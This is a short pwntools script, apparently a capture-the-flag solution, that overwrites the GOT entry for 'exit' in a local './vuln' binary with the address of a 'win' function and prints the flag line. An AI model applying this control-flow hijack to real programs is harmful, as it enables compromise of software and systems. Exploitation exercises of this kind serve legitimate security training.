from pwn import *

context.binary = "./vuln"
p = process()

p.sendline(str(context.binary.got["exit"]).encode("ascii"))
p.sendline(str(context.binary.functions["win"].address).encode("ascii"))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
